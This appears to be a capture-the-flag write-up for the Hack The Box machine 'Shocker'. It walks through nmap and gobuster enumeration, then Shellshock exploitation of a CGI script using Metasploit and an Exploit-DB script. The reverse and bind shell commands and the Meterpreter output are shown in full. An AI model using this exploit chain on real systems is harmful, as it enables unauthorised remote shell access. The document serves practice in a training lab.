</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.80 scan initiated Sun Sep  6 11:36:23 2020 as: nmap -v -Pn -sC -sV -oA nmap/shocker 10.10.10.56</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.56
Host is up <span style="color:#ff79c6">(</span>0.20s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">998</span> closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Site doesn&#39;t have a title <span style="color:#ff79c6">(</span>text/html<span style="color:#ff79c6">)</span>.
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> c4:f8:ad:e8:f8:04:77🇩🇪cf:15:0d:63:0a:18:7e:49 <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 <span style="color:#ff79c6">(</span>ED25519<span style="color:#ff79c6">)</span>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#6272a4"># Nmap done at Sun Sep  6 11:36:43 2020 -- 1 IP address (1 host up) scanned in 19.93 seconds</span>
</code></pre></td></tr></table>
</div>
</div><p>Nothing sweet above, with fuzz with gobuster</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/shocker$ gobuster dir -u http://10.10.10.56 -w /opt/dictionaries/common.txt
<span style="color:#ff79c6">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            http://10.10.10.56
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">10</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/common.txt
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
<span style="color:#ff79c6">===============================================================</span>
2020/09/19 12:13:51 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
<span style="color:#ff79c6">===============================================================</span>
/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htaccess <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htpasswd <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/cgi-bin/ <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/index.html <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/server-status <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
2020/09/19 12:14:13 <span style="color:#8be9fd;font-style:italic">Finished</span>
<span style="color:#ff79c6">===============================================================</span>
</code></pre></td></tr></table>
</div>
</div><p>discovered cgi-bin folder</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/shocker$ gobuster dir -u http://10.10.10.56/cgi-bin -w /opt/dictionaries/common.txt -x sh,php
<span style="color:#ff79c6">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            http://10.10.10.56/cgi-bin
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">10</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/common.txt
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     sh,php
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
<span style="color:#ff79c6">===============================================================</span>
2020/09/19 12:16:46 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
<span style="color:#ff79c6">===============================================================</span>
/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.hta.sh <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.hta.php <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
...
/user.sh <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>discovered /cgi-bin/user.sh</p>
<p>machine name being shocker we have a hint this could be shellshock attack</p>
<h1 id="metasploit">Metasploit</h1>
<p>we get a shell exploiting shellshock</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker run --rm -it -v <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">${</span><span style="color:#8be9fd;font-style:italic">HOME</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/.msf:/home/msf/&#34;</span> -p 4444:4444 -p 1337:1337 -p 8080:8080 metasploitframework/metasploit-framework ./msfconsole
msf6 &gt; grep -i apache search cgi
   <span style="color:#bd93f9">9</span>    auxiliary/dos/http/apache_mod_isapi                                   2010-03-05       normal     No     Apache mod_isapi Dangling Pointer
   <span style="color:#bd93f9">18</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env                        2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span style="color:#ff79c6">(</span>Shellshock<span style="color:#ff79c6">)</span> Scanner
   <span style="color:#bd93f9">91</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec                       2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span style="color:#ff79c6">(</span>Shellshock<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">157</span>  exploit/windows/http/php_apache_request_headers_bof                   2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
   <span style="color:#bd93f9">158</span>  exploit/windows/http/tomcat_cgi_cmdlineargs                           2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
msf6 &gt; grep  apache search cgi
   <span style="color:#bd93f9">9</span>    auxiliary/dos/http/apache_mod_isapi                                   2010-03-05       normal     No     Apache mod_isapi Dangling Pointer
   <span style="color:#bd93f9">18</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env                        2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span style="color:#ff79c6">(</span>Shellshock<span style="color:#ff79c6">)</span> Scanner
   <span style="color:#bd93f9">91</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec                       2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span style="color:#ff79c6">(</span>Shellshock<span style="color:#ff79c6">)</span>
   <span style="color:#bd93f9">157</span>  exploit/windows/http/php_apache_request_headers_bof                   2012-05-08       normal     No     PHP apache_request_headers Function Buffer Overflow
msf6 &gt; use exploit/multi/http/apache_mod_cgi_bash_env
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 10.10.10.56
<span style="color:#8be9fd;font-style:italic">RHOSTS</span> <span style="color:#ff79c6">=</span>&gt; 10.10.10.56
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> targeturi /cgi-bin/user.sh
<span style="color:#8be9fd;font-style:italic">targeturi</span> <span style="color:#ff79c6">=</span>&gt; /cgi-bin/user.sh
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#ff79c6">)</span> &gt; <span style="color:#8be9fd;font-style:italic">set</span> lhost 10.10.14.38
<span style="color:#8be9fd;font-style:italic">lhost</span> <span style="color:#ff79c6">=</span>&gt; 10.10.14.38
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#ff79c6">)</span> &gt; check
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> 10.10.10.56:80 - The target is vulnerable.
msf6 exploit<span style="color:#ff79c6">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#ff79c6">)</span> &gt; run

<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Handler failed to <span style="color:#8be9fd;font-style:italic">bind</span> to 10.10.14.38:4444:-  -
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 0.0.0.0:4444
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Command Stager progress - 100.46% <span style="color:#ff79c6">done</span> <span style="color:#ff79c6">(</span>1097/1092 bytes<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">976712</span> bytes<span style="color:#ff79c6">)</span> to 172.17.0.1
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>172.17.0.2:4444 -&gt; 172.17.0.1:44404<span style="color:#ff79c6">)</span> at 2020-09-19 04:32:10 +0000

meterpreter &gt; getuid
Server username: shelly @ Shocker <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>1000, <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1000, <span style="color:#8be9fd;font-style:italic">euid</span><span style="color:#ff79c6">=</span>1000, <span style="color:#8be9fd;font-style:italic">egid</span><span style="color:#ff79c6">=</span>1000<span style="color:#ff79c6">)</span>
meterpreter &gt; <span style="color:#8be9fd;font-style:italic">pwd</span>
/usr/lib/cgi-bin
meterpreter &gt; cat /home/shelly/user*
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> 1016: Operation failed: <span style="color:#bd93f9">1</span>
meterpreter &gt; <span style="color:#8be9fd;font-style:italic">cd</span> /home/shelly/
meterpreter &gt; cat user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="without-metasploit">Without Metasploit</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:/opt$ searchsploit shellshock | grep py
Apache mod_cgi - <span style="color:#f1fa8c">&#39;Shellshock&#39;</span> Remote Command Injection                                                                      | linux/remote/34900.py
ctf@014202efa8c8:~/htb/shocker$ cp /opt/exploitdb/exploits/linux/remote/34900.py .
ctf@014202efa8c8:~/htb/shocker$ ./34900.py <span style="color:#8be9fd;font-style:italic">rhost</span><span style="color:#ff79c6">=</span>10.10.10.56 <span style="color:#8be9fd;font-style:italic">rport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">80</span> <span style="color:#8be9fd;font-style:italic">lhost</span><span style="color:#ff79c6">=</span>10.10.14.38 <span style="color:#8be9fd;font-style:italic">lport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">9000</span> <span style="color:#8be9fd;font-style:italic">pages</span><span style="color:#ff79c6">=</span>/cgi-bin/user.sh <span style="color:#8be9fd;font-style:italic">proxy</span><span style="color:#ff79c6">=</span>127.0.0.1:8080 <span style="color:#8be9fd;font-style:italic">payload</span><span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">bind</span>
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> Trying exploit on : /cgi-bin/user.sh
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Successfully exploited
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Connected to 10.10.10.56
10.10.10.56&gt; dir
HTTP/1.1 <span style="color:#bd93f9">400</span> Bad Request
Date: Sat, <span style="color:#bd93f9">19</span> Sep <span style="color:#bd93f9">2020</span> 05:09:24 GMT
Server: Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
Content-Length: <span style="color:#bd93f9">301</span>
Connection: close
Content-Type: text/html; <span style="color:#8be9fd;font-style:italic">charset</span><span style="color:#ff79c6">=</span>iso-8859-1

&lt;!DOCTYPE HTML PUBLIC <span style="color:#f1fa8c">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;400 Bad Request&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Bad Request&lt;/h1&gt;
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;address&gt;Apache/2.4.18 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span> Server at 127.0.1.1 Port 80&lt;/address&gt;
&lt;/body&gt;&lt;/html&gt;

10.10.10.56&gt; whoami

10.10.10.56&gt;
</code></pre></td></tr></table>
</div>
</div><p>It does not work with the payload=bind, therefore we try the payload=reverse &hellip; working in a docker container,</p>
<p>creating the socket on the vpn tunnel interface will fail, however we can either:</p>
<ol>
<li>modify the code to bind the port on 0.0.0.0 by replacing <code>addr = (lhost, lport)</code> with <code>addr = ('0.0.0.0', lport)</code></li>
<li>or launch the command from the host machine.</li>
</ol>
<p>This is a success.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
